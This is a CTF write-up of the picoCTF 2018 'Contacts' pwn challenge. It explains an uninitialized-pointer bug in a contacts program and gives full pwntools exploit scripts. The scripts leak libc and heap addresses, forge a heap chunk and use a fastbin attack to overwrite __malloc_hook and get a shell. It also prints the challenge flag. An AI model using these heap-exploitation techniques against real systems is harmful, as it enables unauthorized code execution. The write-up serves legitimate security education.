# Writeup for Contacts - Pwn; 850

[picoCTF](https://2018game.picoctf.com) took place between September 28th and October 12th, and it was great, I enjoyed it very much!  

the organizers did a great job with the challenges, providing both beginner level challenges and ones fitting for more experienced CTF participants.  

I was playing as part of the team noxale, which ended up 36th out of more than 10000 teams!  

## The challenge  

Original description: 

This [program]( https://2018shell1.picoctf.com/static/4e08914d9671c60f31ce060913d88e1f/contacts) for storing your contacts is currently in beta. Can you hijack control and get a shell? Connect with ```nc 2018shell1.picoctf.com 59572```. [Source](https://2018shell1.picoctf.com/static/4e08914d9671c60f31ce060913d88e1f/contacts.c). [libc.so.6](https://2018shell1.picoctf.com/static/4e08914d9671c60f31ce060913d88e1f/libc.so.6)  

The goal of the challenge is pretty clear, let's talk about the flaw it had.  

## The Bug  & The Exploit

Contact is a struct that contains 2 pointers - One for the name and one for the bio.  

This is the function that creates a new contact:  

```C
void create_contact(char *name){
    if (num_contacts == MAX_CONTACTS){
        puts("Too many contacts! Delete one first!");
        return;
    }

    struct contact *contact = (struct contact *)malloc(sizeof(struct contact));
    if (contact == NULL){
        puts("Could not allocate new contact.");
        exit(-1);
    };

    /* make a copy of the name on the heap */
    contact->name = strdup(name);
    if (contact->name == NULL){
        puts("Could not duplicate name.");
        exit(-1);
    }

    contacts[num_contacts++] = contact;
}
```

There is no initialization of the bio field, which means it will still have the value this heap chunk previously had. It was only after seeing the flag that I realized I should've used double free, which would make things easier for me.  

I used the combination of create_contact and delete_contact in order to control the bio pointer of new contacts.

```C
void delete_contact(struct contact *contact){
    free(contact->name);

    /* if the bio is set, free it as well */
    if (contact->bio != NULL){
        free(contact->bio);
    }

    free(contact);

    /* replace the corresponding index with the last contact and decrement num_contacts */
    for (int i = 0; i < num_contacts; i++){
        if (contacts[i] == contact){
            contacts[i] = contacts[num_contacts - 1];
            num_contacts--;
            break;
        }
    }
}
```

Think about the following scenario:  

1. Create a new chunk with a name the size of contact struct (0x10) and set its second qword to an arbitrary pointer.  
2. Set it's bio to a new chunk of the same size as the contact struct.  
3. Delete it. Free order is name, bio, chunk.  
4. Add a new chunk with a name the size of the contact struct.  
   ```new_chunk = previous_chunk, new_name = previous_name.```
5. Add a new chunk.  
   ```new_chunk = previous_name.```  

As we said before, the bio field is not initialized, which means it will contain the value that was previously stored here - name's second qword (a pointer of our choice).  

We can now use print_contacts to print the value pointed by our pointer!!  

Let's use it to leak an address in libc (using the GOT_PLT table) and a heap address (using the contacts array).  

We can use our leaked heap address in order to allocate a fake chunk in the heap (forge a chunk header in the contents of one of the chunks we allocate) and perform a fastbin attack to hijack __malloc_hook.  

By the time we get the pointer to __malloc_hook-0x13 from malloc, it's over - We just need to overwrite it with one_gadget and enjoy our shell :)  

## Way of Work  

I used [libc databse](https://github.com/niklasb/libc-database) and identified the provided libc as 'libc6_2.23-0ubuntu10_amd64'.  

checksec yielded the following result:  

![checksec](images/checksec.png)  

PIE is disabled, which means we know the addresses of the text segment, bss, GOT-PLT, etc.  

Now it's time to start looking at the source code and understand the program's functionality.  

After a quick examine we can understand it's a contact list which provides us the 4 following options: Display contact, create contact, delete_contact and set a contact's bio.  

Each contact is a struct with 2 fields - name and bio - both are pointers allocated by malloc.

Print_contacts and set_bio doesn't do anything exceptional - Both does exactly what their names imply.  

Now let's take a look at create_contact.

```C
void create_contact(char *name){
    if (num_contacts == MAX_CONTACTS){
        puts("Too many contacts! Delete one first!");
        return;
    }

    struct contact *contact = (struct contact *)malloc(sizeof(struct contact));
    if (contact == NULL){
        puts("Could not allocate new contact.");
        exit(-1);
    };

    /* make a copy of the name on the heap */
    contact->name = strdup(name);
    if (contact->name == NULL){
        puts("Could not duplicate name.");
        exit(-1);
    }

    contacts[num_contacts++] = contact;
}
```

Create contact allocates a new contact struct (size is 0x10) and then allocates and copies the name we gave it into its name field. So far everything is good, except for the fact that the bio field is not initialized.  

This is very problematic because bio will just have the value that was previously stored in this chunk (if it had a value). All other functions treat bio as allocated if it's value is not NULL.  

I chose to exploit it with a combination of delete_contact

```C
void delete_contact(struct contact *contact){
    free(contact->name);

    /* if the bio is set, free it as well */
    if (contact->bio != NULL){
        free(contact->bio);
    }

    free(contact);

    /* replace the corresponding index with the last contact and decrement num_contacts */
    for (int i = 0; i < num_contacts; i++){
        if (contacts[i] == contact){
            contacts[i] = contacts[num_contacts - 1];
            num_contacts--;
            break;
        }
    }
}
```

In case we free a contact with a bio, the deletion order will be as follows:  
free(contact->name)  
free(contact->bio)  
free(contact)  

What if all of them had the same size (0x10)?  

We will end up with a fastbin list of size 0x20 (0x10 allocated + headers) that looks like that:  

(head) contact ---> bio ---> name ---> (NULL or next chunk, doesn't really matter)  

If we follow this kind of free with an allocation of 2 contacts (The first contact has a name of length up to 0x10. We mustn't do anything else between the creation of the 2 contacts).  

create_contact starts by allocating our contact struct and then our name.  

The pointers returned from malloc will be as follows:  

new_contact = old_contact  
new_name = old_bio  

Our 0x20 fastbin list now looks like this:  

(head) name ---> (NULL or next chunk, doesn't really matter)  

Calling create_contact will return the previous name as our contact struct.  

We can control the bio field!!  

First, we are going to use it in order to leak a libc address.  

```python
#! /usr/bin/python

from pwn import *
import sys

executable = './contacts'
remote_ip = '2018shell1.picoctf.com'
port = 59572

contacts_count = 0

def exploit(is_remote):
    global r, contacts_count
    
    if is_remote:
        r = remote(remote_ip, port)
        """ Identified the provided libc."""
        libc = ELF('/home/ubuntu/libc-database/db/libc6_2.23-0ubuntu10_amd64.so')
        print 'remote'
    else:
        r = process(executable)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        print 'local'
    puts_got_entry = 0x602020
    
    """ The following block does the following: 
            1. Create a new chunk with name the size of contact struct (0x10) and set its second qword to puts_got_entry.
            2. Set it's bio to a new chunk with the same size as the contact struct.
            3. Delete it. Free order is: name, bio, chunk
            4. Add a new chunk with name the size of the contact struct. new_chunk = previous_chunk, new_name = previous_bio.
            5. Add a new chunk. new_chunk = previous_name.
            6. The bio field is not zeroed so we will have the previous value stored in it as the current value."""
    first_leak_name = 'LeakLibc' + p64(puts_got_entry)[:-1] 
    add_contact(first_leak_name)
    set_bio(first_leak_name, '\x00'*15)
    del_contact(first_leak_name)
    add_contact('B'*15)
    add_contact('C'*15)
    
    """ Print the details of our contacts. The last contact we added will have its bio point to put_got_entry - libc address leak."""
    output = display().split('\n')[contacts_count - 1]
    leaked_puts_address = (output[output.find('- ') + len('- '):].rstrip('\n')).encode('hex')
    print leaked_puts_address
    leaked_puts_address = int(''.join([leaked_puts_address[x: x + 2] for x in range(0, len(leaked_puts_address), 2)][::-1][:6]), 16)
    
    """ Calculate the addresses in libc that are relevant for us."""
    libc_base = leaked_puts_address - libc.symbols['puts']
    __malloc_hook_address = libc_base + libc.symbols['__malloc_hook']
    print '-'*75
    print 'Leaked puts address:', hex(leaked_puts_address)
    print 'Libc base:', hex(libc_base)
    print '__malloc_hook:', hex(__malloc_hook_address)
    print '-'*75

    
    
def menu():
    global r
    
    r.recvuntil('> ')
    
    
def add_contact(name):
    global r, contacts_count
    
    menu()
    print 'Adding', name
    r.sendline('create ' + name)
    r.recvuntil('Created')
    r.recvuntil('\n')
    contacts_count += 1

    
def del_contact(name):
    global r, contacts_count
    
    menu()
    print 'Removing', name
    r.sendline('delete ' + name)
    r.recvuntil('Deleted')
    r.recvuntil('\n')
    contacts_count -= 1

    
def set_bio(name, bio, length=0):
    global r
    
    menu()
    print 'Seting {}`s bio to {}'.format(name, bio)
    r.sendline('bio ' + name)
    """ The length send to the program is the len of the bio provided as argument unless stated otherwise."""
    bio_length = str(length if length != 0 else len(bio))
    """ fgets is called with the size 4. If we send a 3-digits number and a '\n' we will overflow the '\n' into the next input."""
    if len(bio_length) == 3:
        r.sendafter('be?\n', bio_length)
    else:
        r.sendlineafter('be?\n', bio_length)
    r.sendlineafter('bio:\n', bio)
    r.recvuntil('\n')
    

def display():
    global r
    
    menu()
    r.sendline('display')
    return r.recvuntil('\nEnter')[:-len('\nEnter')]
    
    
if __name__ == '__main__':
    is_remote = True
    if len(sys.argv) > 1:
        if sys.argv[1] in ['-d', '-D']:
            is_remote = False
    exploit(is_remote)
```

![leaked_libc](images/leaked_libc.png)  

It worked!! Leaking libc is always a great step towards a shell :)  

We can do the exact same thing with the address of contacts instead of puts_got_entry and leak an address in the heap.  

Let's modify our exploit function.  

```python
def exploit(is_remote):
    global r, contacts_count
    
    if is_remote:
        r = remote(remote_ip, port)
        """ Identified the provided libc."""
        libc = ELF('/home/ubuntu/libc-database/db/libc6_2.23-0ubuntu10_amd64.so')
        print 'remote'
    else:
        r = process(executable)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        print 'local'
    
    
    contacts_addr = 0x6020C0
    puts_got_entry = 0x602020

    """ The following block does the following: 
            1. Create a new chunk with name the size of contact struct (0x10) and set its second qword to puts_got_entry.
            2. Set it's bio to a new chunk with the same size as the contact struct.
            3. Delete it. Free order is: name, bio, chunk
            4. Add a new chunk with name the size of the contact struct. new_chunk = previous_chunk, new_name = previous_bio.
            5. Add a new chunk. new_chunk = previous_name.
            6. The bio field is not zeroed so we will have the previous value stored in it as the current value."""
    first_leak_name = 'LeakLibc' + p64(puts_got_entry)[:-1] 
    add_contact(first_leak_name)
    set_bio(first_leak_name, '\x00'*15)
    del_contact(first_leak_name)
    add_contact('B'*15)
    add_contact('C'*15)
    
    """ Print the details of our contacts. The last contact we added will have its bio point to put_got_entry - libc address leak."""
    output = display().split('\n')[contacts_count - 1]
    leaked_puts_address = (output[output.find('- ') + len('- '):].rstrip('\n')).encode('hex')
    print leaked_puts_address
    leaked_puts_address = int(''.join([leaked_puts_address[x: x + 2] for x in range(0, len(leaked_puts_address), 2)][::-1][:6]), 16)
    
    """ Calculate the addresses in libc that are relevant for us."""
    libc_base = leaked_puts_address - libc.symbols['puts']
    __malloc_hook_address = libc_base + libc.symbols['__malloc_hook']
    print '-'*75
    print 'Leaked puts address:', hex(leaked_puts_address)
    print 'Libc base:', hex(libc_base)
    print '__malloc_hook:', hex(__malloc_hook_address)
    print '-'*75
    
    """ Same as first leak. This time we are leaking an address in the heap."""
    second_leak_name = 'LeakHeap' + p64(contacts_addr)[:-1]
    add_contact(second_leak_name)
    set_bio(second_leak_name, '\x00'*15)
    del_contact(second_leak_name)
    add_contact('D'*15)
    add_contact('E'*15)
    
    """ Print the details of our contacts. The last contact we added will have its bio point to the contacts array - heap address leak."""
    output = display().split('\n')[contacts_count - 1]
    print output
    leaked_heap_address = (output[output.find('- ') + len('- '):].rstrip('\n')).encode('hex')
    leaked_heap_address = int(''.join([leaked_heap_address[x: x + 2] for x in range(0, len(leaked_heap_address), 2)][::-1][:6]), 16)
    print '-'*75
    print 'Leaked heap address:', hex(leaked_heap_address)
    print '-'*75
```

We leaked both libc and an address in the heap. The idea I had was to forge a heap chunk inside the heap and free it with the same technique we used in order to leak values (This time calling delete_contact instead of display). We then allocate a new chunk with the size we just freed and use it to overwrite the next field of a chunk we freed earlier. By doing so we can make it return an arbitrary pointer (as long as it has a size header that fits the same fastbin of the free chunk).  

When returning a pointer of our choice, there is no better candidate then the infamous __malloc_hook-0x23.  

If we do things correctly we will be able to overwrite __malloc_hook with a one_gadget address and get a shell.  

You might wonder why I freed a forged heap chunk instead of freeing __malloc_hook-0x13.  
The reason is a security check performed in _int_free that ensures the freed pointer is aligned (divides by 8 with no remainder).  

```C
if (__builtin_expect ((uintptr_t) p > (uintptr_t) -size, 0)
      || __builtin_expect (misaligned_chunk (p), 0))
    malloc_printerr ("free(): invalid pointer");
```



Adding it all up we get the following exploit function.  

```python
def exploit(is_remote):
    global r, contacts_count
    
    if is_remote:
        r = remote(remote_ip, port)
        """ Identified the provided libc."""
        libc = ELF('/home/ubuntu/libc-database/db/libc6_2.23-0ubuntu10_amd64.so')
        one_gadget_offset = 0xf1147
        print 'remote'
    else:
        r = process(executable)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        print 'local'
    
    
    contacts_addr = 0x6020C0
    puts_got_entry = 0x602020
    
    fake_header_name = p64(0x0101010101010108)*3 + p64(0x81)[:-1]
    """ Add a contact and set it's bio. The bio is later used as a forged header of a heap chunk."""
    add_contact(fake_header_name)
    set_bio(fake_header_name, p64(0) + p64(0x81)[:-1])
    """ Add a contact and set it's bio to pass the following check when we allocate our forged chunk.
        The constrainst: ```if (__builtin_expect (chunksize_nomask (nextchunk) <= 2 * SIZE_SZ, 0)
                            || __builtin_expect (nextsize >= av->system_mem, 0))```."""
    add_contact('Y'*15)
    set_bio('Y'*15, (p64(0x81)*10)[:-1], 0x60)
    
    """ The following block does the following: 
            1. Create a new chunk with name the size of contact struct (0x10) and set its second qword to puts_got_entry.
            2. Set it's bio to a new chunk with the same size as the contact struct.
            3. Delete it. Free order is: name, bio, chunk
            4. Add a new chunk with name the size of the contact struct. new_chunk = previous_chunk, new_name = previous_bio.
            5. Add a new chunk. new_chunk = previous_name.
            6. The bio field is not zeroed so we will have the previous value stored in it as the current value."""
    first_leak_name = 'LeakLibc' + p64(puts_got_entry)[:-1] 
    add_contact(first_leak_name)
    set_bio(first_leak_name, '\x00'*15)
    del_contact(first_leak_name)
    add_contact('B'*15)
    add_contact('C'*15)
    
    """ Print the details of our contacts. The last contact we added will have its bio point to put_got_entry - libc address leak."""
    output = display().split('\n')[contacts_count - 1]
    leaked_puts_address = (output[output.find('- ') + len('- '):].rstrip('\n')).encode('hex')
    print leaked_puts_address
    leaked_puts_address = int(''.join([leaked_puts_address[x: x + 2] for x in range(0, len(leaked_puts_address), 2)][::-1][:6]), 16)
    
    """ Calculate the addresses in libc that are relevant for us."""
    libc_base = leaked_puts_address - libc.symbols['puts']
    __malloc_hook_address = libc_base + libc.symbols['__malloc_hook']
    one_gadget = libc_base + one_gadget_offset
    print '-'*75
    print 'Leaked puts address:', hex(leaked_puts_address)
    print 'Libc base:', hex(libc_base)
    print '__malloc_hook:', hex(__malloc_hook_address)
    print 'One gadget:', hex(one_gadget)
    print '-'*75
    
    """ Same as first leak. This time we are leaking an address in the heap."""
    second_leak_name = 'LeakHeap' + p64(contacts_addr)[:-1]
    add_contact(second_leak_name)
    set_bio(second_leak_name, '\x00'*15)
    del_contact(second_leak_name)
    add_contact('D'*15)
    add_contact('E'*15)
    
    """ Print the details of our contacts. The last contact we added will have its bio point to the contacts array - heap address leak."""
    output = display().split('\n')[contacts_count - 1]
    print output
    leaked_heap_address = (output[output.find('- ') + len('- '):].rstrip('\n')).encode('hex')
    leaked_heap_address = int(''.join([leaked_heap_address[x: x + 2] for x in range(0, len(leaked_heap_address), 2)][::-1][:6]), 16)
    
    """ Used a debugger locally to find the distance between the first block (the one we are leaking) and our forged chunk."""
    target_heap_addr = leaked_heap_address + (0x2b0 - 0x250)
    print '-'*75
    print 'Leaked heap address:', hex(leaked_heap_address)
    print 'Target:', hex(target_heap_addr)
    print '-'*75
    
    """ Same idea as the previous leaks. This time instead of a leak we are inserting an address we want to free (and later on get it back
        from malloc)."""
    my_heap_chunk = 'FakeChnk' + p64(target_heap_addr)[:-1]
    add_contact(my_heap_chunk)
    set_bio(my_heap_chunk, '\x00'*15)
    del_contact(my_heap_chunk)
    add_contact('G'*15)
    add_contact('H'*15)
    
    add_contact('I'*15) # This contact is allocated so we can set its bio with our payload.

    """ By deleting this contact we free our fake heap chunk and can get it back by allocating a 0x70 sized chunk (the header we gave it
        stated a size of 0x81 which is 0x70 + header size (0x10) and prev_in_use bit on)."""
    del_contact('H'*15)
    
    """ After deleting this contact we have a chunk with the size of 0x70 (allocation of 0x60) in it's fastbin.
        We can overwrite its "next" pointer using our forged heap chunk to get back a pointer to a memory of our choosing (as long as its
        header fits the current fastbin)."""
    del_contact('Y'*15)
    
    """ Using a debugger again to find the correct padding we need. We don't want to change any other header so we overwrite them with their 
        previous values. Overwrite the free chunk's "next" pointer to __malloc_hook-0x23 - A useful chunk for fastbin attack due to the size 
        it has(0x7f) and the ability it grants in controlling the code flow upon a malloc invokation."""
    fake_bio =  p64(0) + p64(0x21) + '\x00'*0x10 + p64(0) + p64(0x21) + '\x00'*0x10 + p64(0) + p64(0x71) + p64(__malloc_hook_address  - 0x23)
    set_bio('G'*15, fake_bio, 0x70)
    
    """ Allocate a chunk with the size 0x60 - We will get back the pointer we freed while removing "'Y'*15". Will also put __malloc_hook-0x23 
        as the next size in this bin."""
    set_bio('D'*15, 'a', 0x60)
    target_address = one_gadget
    
    """ Pad the bytes between our chunk and __malloc_hook. Overwrite __malloc_hook with a one_gadget we can satisfy."""
    payload = 'Z'*0x13 + p64(target_address)
    set_bio('I'*15, payload, 0x60)
    
    """ Invoke malloc and get a shell."""
    r.sendline('create a')
    r.interactive()
```

![shell](images/shell.png)  

(Ignore the fl*, I was too lazy to write 'flag.txt').  

The flag is: picoCTF\{4_5pr3e_0f_d0ubl3_fR33_c239ca3c\}  

